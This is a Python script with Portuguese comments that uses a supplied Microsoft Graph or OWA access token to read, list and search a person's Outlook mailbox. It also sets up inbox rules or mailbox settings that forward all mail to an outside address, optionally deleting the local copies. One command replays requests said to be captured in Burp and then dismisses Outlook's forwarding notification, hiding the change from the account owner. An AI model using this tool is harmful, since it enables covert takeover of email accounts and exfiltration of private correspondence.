#!/usr/bin/env python3
"""
Lê emails do Outlook via Microsoft Graph API usando um access token.
"""

import json
import sys
import argparse
import base64
import urllib.request
import urllib.parse
import urllib.error

GRAPH_BASE = "https://graph.microsoft.com/v1.0"
OWA_BASE   = "https://outlook.office.com"
OWA_REST   = "https://outlook.office.com/api/v2.0"


def _jwt_payload(token: str) -> dict:
    part = token.split(".")[1]
    part += "=" * (-len(part) % 4)
    return json.loads(base64.urlsafe_b64decode(part))


def _base(use_owa: bool) -> str:
    return OWA_REST if use_owa else GRAPH_BASE


def _request(method: str, access_token: str, url: str, body: dict | None = None) -> dict:
    data = json.dumps(body).encode("utf-8") if body else None
    req  = urllib.request.Request(url, data=data, method=method)
    req.add_header("Authorization", f"Bearer {access_token}")
    req.add_header("Accept", "application/json")
    if data:
        req.add_header("Content-Type", "application/json")

    try:
        with urllib.request.urlopen(req) as resp:
            content = resp.read().decode("utf-8")
            return json.loads(content) if content else {}
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8")
        try:
            err = json.loads(raw)
        except json.JSONDecodeError:
            err = {"raw": raw}
        print(f"[ERRO] HTTP {e.code}", file=sys.stderr)
        print(json.dumps(err, indent=2), file=sys.stderr)
        sys.exit(1)


def _camel(obj):
    """Converte PascalCase → camelCase recursivamente (para respostas OWA REST v2.0)."""
    if isinstance(obj, dict):
        return {k[0].lower() + k[1:]: _camel(v) for k, v in obj.items()}
    if isinstance(obj, list):
        return [_camel(i) for i in obj]
    return obj


def api_get(token: str, path: str, owa: bool = False) -> dict:
    result = _request("GET", token, f"{_base(owa)}{path}")
    return _camel(result) if owa else result

def graph_get(token: str, path: str) -> dict:
    return api_get(token, path, owa=False)

def graph_patch(access_token: str, path: str, body: dict) -> dict:
    return _request("PATCH", access_token, f"{GRAPH_BASE}{path}", body)

def graph_post(access_token: str, path: str, body: dict) -> dict:
    return _request("POST", access_token, f"{GRAPH_BASE}{path}", body)

def graph_delete(access_token: str, path: str) -> dict:
    return _request("DELETE", access_token, f"{GRAPH_BASE}{path}")


def _print_messages(messages: list):
    for i, msg in enumerate(messages, 1):
        sender = msg.get("from", {}).get("emailAddress", {})
        lido   = "" if msg.get("isRead") else "[NÃO LIDO] "
        print(f"{i:02}. {lido}{msg.get('subject', '(sem assunto)')}")
        print(f"     De: {sender.get('name')} <{sender.get('address')}>")
        print(f"     Em: {msg.get('receivedDateTime', '')[:19].replace('T',' ')}")
        print(f"     Preview: {msg.get('bodyPreview','')[:100]}")
        print()


def cmd_me(token: str, owa: bool = False, **_):
    data = api_get(token, "/me", owa=owa)
    print(f"Nome    : {data.get('displayName') or data.get('alias')}")
    print(f"Email   : {data.get('mail') or data.get('userPrincipalName') or data.get('EmailAddress', {}).get('Address')}")
    print(f"ID      : {data.get('id')}")


def cmd_inbox(token: str, top: int = 10, owa: bool = False, **_):
    params = f"$top={top}&$orderby=receivedDateTime%20desc&$select=subject,from,receivedDateTime,isRead,bodyPreview"
    data = api_get(token, f"/me/mailFolders/inbox/messages?{params}", owa=owa)
    messages = data.get("value", [])
    print(f"\n=== Inbox ({len(messages)} mensagens) {'[OWA]' if owa else '[Graph]'} ===\n")
    _print_messages(messages)


def cmd_read(token: str, msg_id: str, owa: bool = False, **_):
    data = api_get(token, f"/me/messages/{msg_id}?$select=subject,from,toRecipients,receivedDateTime,body", owa=owa)
    sender  = data.get("from", {}).get("emailAddress", {})
    to_list = [r["emailAddress"]["address"] for r in data.get("toRecipients", [])]
    print(f"Assunto : {data.get('subject')}")
    print(f"De      : {sender.get('name')} <{sender.get('address')}>")
    print(f"Para    : {', '.join(to_list)}")
    print(f"Data    : {data.get('receivedDateTime','')[:19].replace('T',' ')}")
    print(f"\n--- Corpo ---")
    body = data.get("body", {})
    if body.get("contentType") == "html":
        import re
        text = re.sub(r"<[^>]+>", "", body.get("content", ""))
        text = re.sub(r"\n{3,}", "\n\n", text).strip()
        print(text[:3000])
    else:
        print(body.get("content", "")[:3000])


def cmd_folders(token: str, owa: bool = False, **_):
    data = api_get(token, "/me/mailFolders?$top=20&$select=displayName,totalItemCount,unreadItemCount", owa=owa)
    print(f"\n=== Pastas de email {'[OWA]' if owa else '[Graph]'} ===\n")
    for f in data.get("value", []):
        print(f"  {f.get('displayName'):<25} total={f.get('totalItemCount'):>5}  não lidos={f.get('unreadItemCount'):>4}")


def cmd_search(token: str, query: str, top: int = 10, owa: bool = False, **_):
    q    = urllib.parse.quote(query)
    data = api_get(token, f"/me/messages?$search=\"{q}\"&$top={top}&$select=subject,from,receivedDateTime,bodyPreview", owa=owa)
    messages = data.get("value", [])
    print(f"\n=== Busca: '{query}' ({len(messages)} resultados) {'[OWA]' if owa else '[Graph]'} ===\n")
    for i, msg in enumerate(messages, 1):
        sender = msg.get("from", {}).get("emailAddress", {})
        print(f"{i:02}. {msg.get('subject','(sem assunto)')}")
        print(f"     De: {sender.get('address')}  |  {msg.get('receivedDateTime','')[:10]}")
        print(f"     {msg.get('bodyPreview','')[:100]}")
        print()


def cmd_forward_set(token: str, forward_to: str, keep_copy: bool = True, rule_name: str = "Redirecionar tudo", **_):
    """
    Ativa redirecionamento criando uma regra de caixa de entrada.
    Remove qualquer regra anterior com o mesmo nome antes de criar.
    """
    if not forward_to:
        print("[ERRO] Informe --forward-to <email>", file=sys.stderr)
        sys.exit(1)

    # Remove regra duplicada se existir
    rules = graph_get(token, "/me/messageRules")
    for r in rules.get("value", []):
        if r.get("displayName") == rule_name:
            graph_delete(token, f"/me/messageRules/{r['id']}")

    payload = {
        "displayName": rule_name,
        "sequence": 1,
        "isEnabled": True,
        "conditions": {},
        "actions": {
            "forwardTo": [
                {"emailAddress": {"address": forward_to}}
            ],
            "stopProcessingRules": False,
        },
    }
    if not keep_copy:
        payload["actions"]["delete"] = True

    result = graph_post(token, "/me/messageRules", payload)
    print(f"[OK] Redirecionamento ativado → {forward_to}")
    print(f"     Regra: '{result.get('displayName')}' (ID: {result.get('id')})")
    print(f"     Manter cópia local: {'sim' if keep_copy else 'não'}")


def cmd_forward_rule(token: str, forward_to: str, rule_name: str = "Redirecionar tudo", keep_copy: bool = True, **_):
    """
    Cria regra de caixa de entrada que redireciona todos os emails (método 2).
    Requer escopo MailFolder.ReadWrite.
    """
    payload = {
        "displayName": rule_name,
        "sequence": 1,
        "isEnabled": True,
        "conditions": {},
        "actions": {
            "forwardTo": [
                {"emailAddress": {"address": forward_to}}
            ],
            "stopProcessingRules": False,
            **({"delete": True} if not keep_copy else {}),
        },
    }
    result = graph_post(token, "/me/messageRules", payload)
    print(f"[OK] Regra criada: '{result.get('displayName')}' (ID: {result.get('id')})")
    print(f"     Redirecionando para → {forward_to}")
    print(f"     Manter cópia local  : {'sim' if keep_copy else 'não'}")


def cmd_forward_list(token: str, **_):
    """Lista regras de caixa de entrada existentes."""
    rules = graph_get(token, "/me/messageRules")
    print("\n=== Regras de caixa de entrada ===")
    entries = rules.get("value", [])
    if not entries:
        print("  Nenhuma regra encontrada.")
    for r in entries:
        status = "ON" if r.get("isEnabled") else "OFF"
        actions = r.get("actions", {})
        fwd_to  = [x["emailAddress"]["address"] for x in actions.get("forwardTo", [])]
        fwd_as  = [x["emailAddress"]["address"] for x in actions.get("forwardAsAttachmentTo", [])]
        redirect = [x["emailAddress"]["address"] for x in actions.get("redirectTo", [])]
        destinos = fwd_to + fwd_as + redirect
        print(f"  [{status}] {r.get('displayName'):<35} ID={r.get('id')}")
        if destinos:
            print(f"       → {', '.join(destinos)}")


def cmd_forward_remove(token: str, rule_id: str = None, **_):
    """Remove regra de redirecionamento pelo ID."""
    if not rule_id:
        print("[ERRO] Informe --rule-id (use forward-list para ver os IDs)", file=sys.stderr)
        sys.exit(1)
    graph_delete(token, f"/me/messageRules/{rule_id}")
    print(f"[OK] Regra {rule_id} removida.")


def cmd_forward_owa(token: str, forward_to: str, keep_copy: bool = True, **_):
    """
    Ativa redirecionamento via OWA interno (service.svc SetMailbox).
    Requer token com aud=https://outlook.office.com (use --owa no refresh script).
    Replica exatamente os requests capturados no Burp.
    """
    if not forward_to:
        print("[ERRO] Informe --forward-to <email>", file=sys.stderr)
        sys.exit(1)

    claims = _jwt_payload(token)
    tid    = claims.get("tid", "")
    puid   = claims.get("puid", "")
    anchor = f"PUID:{puid}@{tid}" if puid and tid else ""

    # Request 1: SetMailbox via OWA service.svc
    postdata = {
        "__type": "SetMailboxRequest:#Exchange",
        "Header": {
            "__type": "JsonRequestHeaders:#Exchange",
            "RequestServerVersion": "V2018_01_08",
            "TimeZoneContext": {
                "__type": "TimeZoneContext:#Exchange",
                "TimeZoneDefinition": {
                    "__type": "TimeZoneDefinitionType:#Exchange",
                    "Id": "E. South America Standard Time",
                },
            },
        },
        "Mailbox": {
            "AddressString": forward_to,
            "DeliverToMailboxAndForward": keep_copy,
        },
    }

    url = f"{OWA_BASE}/owa/service.svc?action=SetMailbox&app=Mail"
    req = urllib.request.Request(url, data=b"", method="POST")
    req.add_header("Authorization",    f"Bearer {token}")
    req.add_header("Content-Type",     "application/json; charset=utf-8")
    req.add_header("Content-Length",   "0")
    req.add_header("Action",           "SetMailbox")
    req.add_header("X-Req-Source",     "Mail")
    req.add_header("X-Owa-Urlpostdata", urllib.parse.quote(json.dumps(postdata)))
    req.add_header("Prefer",           'IdType="ImmutableId", exchange.behavior="IncludeThirdPartyOnlineMeetingProviders"')
    if tid:
        req.add_header("X-Tenantid", tid)
    if anchor:
        req.add_header("X-Anchormailbox", anchor)
    req.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36")

    try:
        with urllib.request.urlopen(req) as resp:
            body = resp.read().decode("utf-8")
            result = json.loads(body) if body else {}
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8")
        try:
            err = json.loads(raw)
        except json.JSONDecodeError:
            err = {"raw": raw}
        print(f"[ERRO] HTTP {e.code}", file=sys.stderr)
        print(json.dumps(err, indent=2), file=sys.stderr)
        sys.exit(1)

    print(f"[OK] SetMailbox enviado → {forward_to}")
    print(f"     DeliverToMailboxAndForward: {keep_copy}")
    if result:
        print(f"     Resposta: {json.dumps(result)[:200]}")

    # Request 2: dismiss notificação de forwarding no OWA (opcional, não crítico)
    corr_id = "00000000-0000-0000-0000-000000000000"
    notif_body = json.dumps({
        "correlationId": corr_id,
        "options": {
            "firstShownDate": "2026-01-01T00:00:00.000Z",
            "feature": 66,
            "itemClass": "MailForwardingNotification",
        },
    }).encode("utf-8")
    notif_url = f"{OWA_BASE}/ows/v1.0/OutlookOptions/MailForwardingNotification"
    notif_req = urllib.request.Request(notif_url, data=notif_body, method="PATCH")
    notif_req.add_header("Authorization", f"Bearer {token}")
    notif_req.add_header("Content-Type",  "application/json")
    if anchor:
        notif_req.add_header("X-Anchormailbox", anchor)
        notif_req.add_header("X-Routingparameter-Sessionkey", anchor)
    if tid:
        notif_req.add_header("X-Tenantid", tid)
    try:
        urllib.request.urlopen(notif_req)
        print("     Notificação OWA dispensada.")
    except urllib.error.HTTPError:
        pass  # não crítico


COMMANDS = {
    "me":             cmd_me,
    "inbox":          cmd_inbox,
    "read":           cmd_read,
    "folders":        cmd_folders,
    "search":         cmd_search,
    "forward-set":    cmd_forward_set,
    "forward-rule":   cmd_forward_rule,
    "forward-list":   cmd_forward_list,
    "forward-remove": cmd_forward_remove,
    "forward-owa":    cmd_forward_owa,
}


def main():
    parser = argparse.ArgumentParser(description="Acessa email do Outlook via MS Graph")
    parser.add_argument("--token",      required=True, help="Access token do MS Graph")
    parser.add_argument("cmd",          choices=COMMANDS.keys(),
                        help="me | inbox | read | folders | search | forward-set | forward-rule | forward-list | forward-remove")
    parser.add_argument("--top",        type=int, default=10,  help="Qtd de mensagens (padrão 10)")
    parser.add_argument("--msg-id",     help="ID da mensagem (para cmd=read)")
    parser.add_argument("--query",      help="Texto de busca (para cmd=search)")
    parser.add_argument("--forward-to", help="Email de destino do redirecionamento")
    parser.add_argument("--rule-name",  default="Redirecionar tudo", help="Nome da regra (para forward-rule)")
    parser.add_argument("--rule-id",    help="ID da regra a remover (para forward-remove)")
    parser.add_argument("--no-copy",    action="store_true", help="Não manter cópia local (forward-rule)")
    parser.add_argument("--owa",        action="store_true", help="Usar token OWA (outlook.office.com/api/v2.0) em vez do Graph")
    args = parser.parse_args()

    COMMANDS[args.cmd](
        token      = args.token,
        top        = args.top,
        msg_id     = args.msg_id,
        query      = args.query,
        forward_to = args.forward_to,
        rule_name  = args.rule_name,
        rule_id    = args.rule_id,
        keep_copy  = not args.no_copy,
        owa        = args.owa,
    )


if __name__ == "__main__":
    main()
